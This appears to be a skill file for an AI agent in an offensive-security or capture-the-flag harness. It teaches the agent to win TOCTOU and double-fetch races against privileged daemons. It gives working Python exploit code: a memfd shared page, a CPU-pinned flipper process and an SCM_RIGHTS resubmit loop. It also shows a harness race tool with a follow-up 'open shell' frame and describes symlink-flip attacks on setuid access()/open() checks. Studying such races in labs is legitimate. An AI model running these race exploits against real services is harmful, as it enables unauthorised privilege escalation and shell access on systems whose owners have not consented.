---
name: race-condition-toctou
when: a validator's accept cannot be satisfied by ANY static input — it re-reads your buffer, demands one field equal two different values (check-then-commit / double-fetch), or a privileged daemon validates then acts on a file/shared page you control
tools: [python_exec, session, shell]
phase: exploit
---
# Winning a TOCTOU / double-fetch race

Some gates are **impossible to satisfy statically on purpose.** The daemon reads a
field you control, then reads it AGAIN and acts on the second read — so the value must
be one thing at check time and another at commit time. You cannot build a file/frame
that is both. You win it as a RACE: put the data in memory the daemon shares with you
and change it from a second thread/process *while* the daemon is mid-validation.

## Recognise it — stop trying to construct, the answer is not a preimage

You are looking at a race (not a construction problem) when ANY of these hold:

- **The emulator says so.** `python3 -m harness.re_emulate ./bin --start <fn> --solve`
  now prints **`RACE (double-fetch / TOCTOU)`** when the validator compares ONE input
  offset against **two different constants** — e.g. `[+0x00] is required to equal
  0xAAAA and 0xBBBB at different reads`. That is the machine-confirmed double-fetch.
  A static `--solve` can never satisfy it; emulation is single-threaded over static
  memory and **cannot reveal or solve a race** — do not read its "needs a hash
  preimage" fallback as "build a magic file". Point `--start` at the DECISION function
  (the dispatcher that reads the field and branches), not just an inner helper, so both
  reads land on one trace; `--arg` if the page pointer is not in `rdi`.
- **By eye:** the handler reads your field, does work (a measurement loop, a
  `clock_gettime` spin, a hash), then **re-reads the same field** and authorises on the
  second value. The "measurement" is the RACE WINDOW, not content you must forge.
- **The wire tell:** one submission returns a "preview/pending" status, and the SAME
  submission sometimes returns "authorised" — a timing-dependent outcome means a race.

If you catch yourself trying to construct a >Nkb file whose hash equals a magic number,
STOP: re-check whether that field is simply read twice. It usually is.

## Exploit it — shared page + a concurrent flipper + resubmit

The buffer must live in memory the daemon reads *by reference* (so your writes are
visible to it), not a copy. The portable way is an anonymous **memfd** you `mmap`
`MAP_SHARED` and hand to the daemon (over `SCM_RIGHTS` if it takes an fd — see
`pwntools-recipes`). Then a background writer flips the field while you resubmit.

### The fast path: the baked `win_race` driver — use it, do not hand-write this

The harness bakes this entire dance as a tool. Reach for it FIRST: hand-writing the
concurrency (shared page + fd passing + a background flipper + a resubmit loop) is the
part runs get subtly wrong. You supply only what you reversed; the tool does the
`memfd_create` + `mmap MAP_SHARED` + `SCM_RIGHTS` + a CPU-pinned flipper + resubmit:

```
python3 -m harness.win_race \
  --sock <daemon unix socket path> \
  --submit-hex <the frame you send on the socket, hex> \
  --field-offset <offset of the mode field within the page> \
  --preview <value the daemon's FIRST read wants> \
  --commit  <value the RE-READ must see to authorise> \
  --success <status value in the reply that means authorised> \
  [--page-hex <full request page bytes, hex> | --page-size 4096] \
  [--after-hex <a follow-up frame to send once authorised, e.g. open-shell>] \
  [--attempts 5000] [--flipper process|thread] [--pin <cpu>]
```

The `--preview`/`--commit` values are exactly what `re_emulate` printed in its
`RACE (double-fetch / TOCTOU)` verdict; the socket/frame/offset/success you reverse from
the protocol. Prove the mechanics in-image first with
`python3 -m harness.win_race --selftest` (it beats a self-hosted check-then-commit
daemon). If it never authorises: confirm the field offset and the two values against the
emulator verdict, and that the daemon maps the fd you pass (some read the page by value
from the frame — then the field lives in the FRAME, so drive the manual loop below and
flip it there between resubmits).

### The manual version (only if you must customise the wire handling)

```python
import os, mmap, socket, struct, multiprocessing

PAGE = 4096
MODE_CHECK  = 0xAAAAAAAA   # <- the FIRST value the validator demands (from your reversing)
MODE_COMMIT = 0xBBBBBBBB   # <- the SECOND value it demands on the re-read
STATUS_OK   = 0xCCCCCCCC   # <- the "authorised" status you reversed

# 1. a page the daemon and you both see
fd = os.memfd_create("req", os.MFD_CLOEXEC)
os.ftruncate(fd, PAGE)
shared = mmap.mmap(fd, PAGE, mmap.MAP_SHARED, mmap.PROT_READ | mmap.PROT_WRITE)
struct.pack_into("<I", shared, 0, MODE_CHECK)     # start on the value the FIRST check wants

# 2. a writer that hammers the field between the two values (own CPU if allowed)
def flipper(shared, stop):
    try: os.sched_setaffinity(0, {sorted(os.sched_getaffinity(0))[-1]})
    except OSError: pass
    view = memoryview(shared)[:4].cast("I")
    while not stop.is_set():
        for _ in range(4096):
            view[0] = MODE_COMMIT
            view[0] = MODE_CHECK
    view.release()

ctx = multiprocessing.get_context("fork")
stop = ctx.Event()
w = ctx.Process(target=flipper, args=(shared, stop), daemon=True); w.start()

# 3. resubmit until the flip lands inside the daemon's window (usually a few tries)
try:
    for attempt in range(200):
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.connect(SOCK_PATH)
        s.sendmsg([frame_bytes], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, struct.pack("i", fd))])
        status = struct.unpack("<I", s.recv(4)[:4])[0]   # parse per the response you reversed
        s.close()
        if status == STATUS_OK:
            print("won on attempt", attempt); break
finally:
    stop.set(); w.join(timeout=1)
    if w.is_alive(): w.kill()
```

Then use the authorisation exactly as the protocol grants it (write your uid to an
allow-file, send the "open shell" command, receive a shell fd — reverse that step and
drive it with `pwntools-recipes`).

## Make the window winnable

- **Flip in a tight loop, ideally on a different CPU** (`sched_setaffinity`; best-effort
  — wrap in try/except, a sealed cell may deny it and it still often wins). More flips
  per unit time = higher hit rate.
- **A separate process beats a thread** (no GIL fighting the daemon's reads), but if
  `multiprocessing`/`fork` is constrained, a plain `threading.Thread` running the same
  flip loop still wins when the daemon's window is wide (thousands of iterations).
- **Resubmit in a loop** — the window is probabilistic; a handful of attempts is normal.
  If it never wins after many tries, widen the flip loop or confirm `MAP_SHARED` (a
  private mapping the daemon can't see is the usual bug), and that the daemon reads the
  fd YOU passed (not its own copy).
- **`SO_PEERCRED` still applies:** if the socket also checks your uid/gid, become that
  user first (`protocol-reversing` → Unix-domain sockets). The race and the credential
  gate are independent — satisfy both.

## Other TOCTOU shapes (same idea, different medium)

- **File check-then-use:** the daemon `stat`s / validates a path, then opens it. Swap
  the path (symlink flip) or the file's content between the two, in a loop.
- **`access()` then `open()` as root:** classic setuid TOCTOU — flip a symlink between a
  file you own and the target between the two syscalls.

The invariant: find the two operations on the same name/handle, and change what that
name resolves to in the gap. `consult_skill 'deception-awareness'` if a note claims the
gate wants a static magic value — the binary's double read is ground truth.
